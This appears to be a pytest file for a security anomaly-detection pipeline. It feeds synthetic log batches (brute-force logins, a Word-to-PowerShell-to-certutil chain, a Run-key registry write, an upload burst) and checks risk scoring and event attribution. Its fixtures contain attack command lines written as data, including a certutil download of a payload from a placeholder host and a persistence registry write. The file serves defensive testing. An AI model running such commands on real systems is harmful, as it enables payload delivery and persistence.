"""Round-5 Phase 0: the mixed-entity, multi-stage batch harness.

The reviewer's verification scenario (nablafeedback4.txt) asserted against
the DESIRED end state — RED on current code, GREEN after the S1–S4 fixes.
This file is the witness that the fixes actually fixed the finding, not
just the unit tests beside it.

Scenario, one batch:
  1. brute force against human user carol (10 failed logins 03:00–03:27)
     + successful login from a new IP at 03:31;
  2. Word→PowerShell spawn (03:40) + certutil download (03:50) on host
     ws-carol, run as root;
  3. a signature detection on a svc-* principal;
  4. a multi-hour upload: 120-event burst at 03:00, normal hours elsewhere
     for user dave;
  5. benign svc-noise: svc-scanner absorbing routine auth failures
     WITHOUT signature detections — must not trend toward the cutoff.

Chain-window semantics (Epsilon STRONG 2): temporal linking is by MAX GAP
between ADJACENT anomalies, not span. Largest adjacent gap in the carol
sequence is 03:00→03:27 = 27 min, inside the default 30-min window. The
harness passes time_window_minutes explicitly so a future default change
flakes loudly, not silently.
"""

from datetime import datetime, timedelta, timezone

import pytest

D = "2026-08-15T"


def _carol_events():
    evts = []
    for i in range(10):
        evts.append({
            "user": "carol", "action": "login_failure", "type": "authentication",
            "timestamp": f"{D}03:{i * 3:02d}:00Z", "source_ip": "203.0.113.5",
            "host": "ws-carol",
        })
    evts.append({
        "user": "carol", "action": "login_success", "type": "authentication",
        "timestamp": f"{D}03:31:00Z", "source_ip": "198.51.100.9", "host": "ws-carol",
    })
    return evts


def _root_process_events():
    return [
        {"user": "root", "type": "endpoint", "action": "process",
         "timestamp": f"{D}03:40:00Z", "process": "WINWORD.EXE",
         "parent_process": "explorer.exe", "command_line": "winword.exe doc.docx",
         "host": "ws-carol"},
        {"user": "root", "type": "endpoint", "action": "process",
         "timestamp": f"{D}03:41:00Z", "process": "powershell.exe",
         "parent_process": "WINWORD.EXE",
         "command_line": "powershell.exe -enc AAAA", "host": "ws-carol"},
        {"user": "root", "type": "endpoint", "action": "process",
         "timestamp": f"{D}03:50:00Z", "process": "certutil.exe",
         "parent_process": "powershell.exe",
         "command_line": "certutil -urlcache -f http://x/payload.exe",
         "host": "ws-carol"},
    ]


def _svc_signature_events():
    # registry-abuse shape on a svc principal: suspicious Run-key write
    return [
        {"user": "svc-backup", "type": "endpoint", "action": "registry_write",
         "timestamp": f"{D}03:45:00Z",
         "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
         "registry_value": "C:\\Users\\Public\\svc-helper.exe",
         "process": "reg.exe", "command_line": "reg add HKCU\\...\\Run /v x /d svc-helper.exe",
         "host": "ws-file"},
    ]


def _dave_day_events():
    # Multi-hour upload for dave: normal 6/h day + a 120-event burst at 03:00
    evts = []
    for h in range(24):
        n = 120 if h == 3 else 6
        for i in range(n):
            evts.append({
                "user": "dave", "action": "activity", "type": "authentication",
                "timestamp": f"{D}{h:02d}:{i % 60:02d}:00Z",
                "source_ip": "192.0.2.10", "host": "ws-dave",
            })
    return evts


def _svc_noise_events():
    # Benign service noise: routine auth failures against svc-scanner,
    # no signature detections. Must NOT trend toward the cutoff.
    evts = []
    for i in range(8):
        evts.append({
            "user": "svc-scanner", "action": "login_failure", "type": "authentication",
            "timestamp": f"{D}0{i + 1}:15:00Z", "source_ip": "10.0.0.9",
            "host": "scan-appliance",
        })
    return evts


def _full_batch():
    return (_carol_events() + _root_process_events() + _svc_signature_events()
            + _dave_day_events() + _svc_noise_events())


class TestMixedEntityRiskAttribution:
    """S1 + S2: every attacked entity receives risk."""

    def test_root_signature_activity_scores(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        out = drive_pipeline(_root_process_events(), tmp_path, monkeypatch)
        assert out["risk_error"] is None, out["risk_error"]
        store = out["risk_store"]
        root = store.scores.get("root") if store else None
        assert root is not None, (
            "S1: root's signature detections produced no risk entity — "
            "machine accounts are excluded from risk entirely")
        assert root.overall > 0

    def test_svc_signature_activity_scores(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        out = drive_pipeline(_svc_signature_events(), tmp_path, monkeypatch)
        store = out["risk_store"]
        svc = store.scores.get("svc-backup") if store else None
        assert svc is not None, "S1: svc-* signature detections produced no risk entity"
        assert svc.overall > 0

    def test_host_entity_scores_from_root_activity(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        out = drive_pipeline(_root_process_events(), tmp_path, monkeypatch)
        store = out["risk_store"]
        ws = store.scores.get("ws-carol") if store else None
        assert ws is not None, (
            "S2: host-only anomalies produced no host risk entity — "
            "empty-user anomalies are dropped by the grouping key")
        assert ws.overall > 0

    def test_human_scores_unchanged_by_machine_fixes(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        out = drive_pipeline(_carol_events(), tmp_path, monkeypatch)
        store = out["risk_store"]
        carol = store.scores.get("carol") if store else None
        assert carol is not None and carol.overall > 0


class TestEventIdDistinctness:
    """S3: detections over distinct events carry distinct evidence."""

    def test_multistage_batch_yields_distinct_event_ids(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        batch = _carol_events() + _root_process_events()
        out = drive_pipeline(batch, tmp_path, monkeypatch)
        anoms = out["detection"].anomalies
        with_ids = [a for a in anoms if a.get("event_ids")]
        assert len(with_ids) >= 3, (
            f"S3: expected ≥3 anomalies with event_ids, got {len(with_ids)} "
            f"from a {len(batch)}-event multi-stage batch")
        ids = set()
        for a in with_ids:
            ids.update(a["event_ids"])
        assert len(ids) >= 3, (
            f"S3: {len(with_ids)} anomalies collapsed to {len(ids)} distinct "
            f"event ids — distinct attack steps are merging")

        # The precise witness (unfixed code passes the count check above on
        # per-event detections' IDs while the aggregate disease persists):
        # failed_login_ratio's evidence is TEN failed logins — it must carry
        # more than one event id. Today it carries exactly one: the user's
        # newest event (the successful login), which is not even evidence
        # for the ratio it reports.
        flr = [a for a in anoms if a.get("detection_method") == "failed_login_ratio"]
        assert flr, "expected a failed_login_ratio anomaly from the brute force"
        assert len(flr[0].get("event_ids") or []) >= 3, (
            f"S3: failed_login_ratio (10 failed logins as evidence) carries "
            f"{len(flr[0].get('event_ids') or [])} event id(s) — aggregates "
            f"must cite their own contributing events, not the newest event")

    def test_host_side_detections_do_not_merge(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        out = drive_pipeline(_root_process_events(), tmp_path, monkeypatch)
        host_anoms = [a for a in out["detection"].anomalies
                      if str(a.get("detection_method", "")).startswith("entity_")
                      and a.get("host") == "ws-carol"]
        if len(host_anoms) >= 2:
            ids = set()
            for a in host_anoms:
                ids.update(a.get("event_ids") or [])
            assert len(ids) >= 2, (
                "S3 (host axis): host-keyed detections collapsed to one event id")


class TestBurstVisibility:
    """S4: multi-hour batches score the burst hour, not just the newest."""

    def test_day_upload_burst_hour_is_detected(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        # Warm dave first: rate anomalies need a baseline to deviate from
        # (4 days of steady 6/h) — a cold profile has nothing to score
        # against, and the batch-level EWMA/CUSUM fallbacks carry the
        # signal instead. The entity path is the one S4 changed.
        warm = []
        for day in (8, 9, 10, 11):
            warm += [{"user": "dave", "action": "activity", "type": "authentication",
                      "timestamp": f"2026-08-{day}T{h:02d}:{i:02d}:00Z",
                      "source_ip": "192.0.2.10", "host": "ws-dave"}
                     for h in range(24) for i in range(6)]
        drive_pipeline(warm, tmp_path, monkeypatch)
        out = drive_pipeline(_dave_day_events(), tmp_path, monkeypatch)
        anoms = out["detection"].anomalies
        rate_anoms = [a for a in anoms
                      if a.get("detection_method") in
                      ("entity_z_score", "entity_activity_spike",
                       "entity_behavior_composite", "ewma")]
        assert rate_anoms, (
            "S4: 120-event burst hour (z≈46 vs typical 6/h) produced no rate "
            f"anomaly. Anomalies: "
            f"{[a.get('detection_method') for a in anoms]}")
        # The anomaly's timestamp must fall INSIDE the burst hour
        for a in rate_anoms:
            if (a.get("timestamp") or "").startswith(f"{D}03"):
                break
        else:
            raise AssertionError(
                f"S4: rate anomaly timestamp not in burst hour 03:00–04:00 — "
                f"got {[(a.get('detection_method'), a.get('timestamp')) for a in rate_anoms]}")


class TestBenignSvcNoise:
    """R10: the failed_login_ratio-keep decision, measured."""

    def test_benign_svc_noise_stays_below_cutoff(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        out = drive_pipeline(_svc_noise_events(), tmp_path, monkeypatch)
        store = out["risk_store"]
        svc = store.scores.get("svc-scanner") if store else None
        cutoff = 60.0  # investigation cutoff default
        if svc is not None:
            assert svc.overall < cutoff, (
                f"R10: benign svc noise trended to {svc.overall:.1f} — "
                f"failed_login_ratio on machine accounts needs the accepted-risk "
                f"decision revisited")


class TestFullBatch:
    """The reviewer's composite scenario, end to end."""

    def test_all_attacked_entities_score_and_chain_forms(self, tmp_path, monkeypatch):
        from tests.harness.conftest import drive_pipeline
        out = drive_pipeline(_full_batch(), tmp_path, monkeypatch)
        assert out["risk_error"] is None, out["risk_error"]
        store = out["risk_store"]
        assert store is not None
        for eid in ("carol", "root", "svc-backup", "ws-carol"):
            ent = store.scores.get(eid)
            assert ent is not None and ent.overall > 0, (
                f"{eid} did not receive non-zero risk in the composite batch")

        # Chain: ≥3 distinct events across the carol/root detections.
        from nabla.temporal import build_temporal_chains
        anoms = out["detection"].anomalies
        chains = build_temporal_chains(anoms, time_window_minutes=30)
        ids = set()
        for a in anoms:
            ids.update(a.get("event_ids") or [])
        assert len(ids) >= 3, (
            f"S3 (composite): {len(anoms)} anomalies across the multi-stage "
            f"batch collapsed to {len(ids)} distinct event ids")
